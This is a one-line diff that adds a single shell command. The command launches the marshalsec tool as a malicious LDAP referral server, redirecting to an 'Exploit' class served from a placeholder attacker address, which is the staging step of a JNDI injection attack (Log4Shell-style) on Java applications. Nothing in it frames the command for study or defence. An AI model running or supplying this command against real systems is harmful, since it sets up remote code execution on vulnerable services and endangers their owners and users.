@@ -1,0 +1,1 @@
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://<ATTACKER_IP>:8000/#Exploit
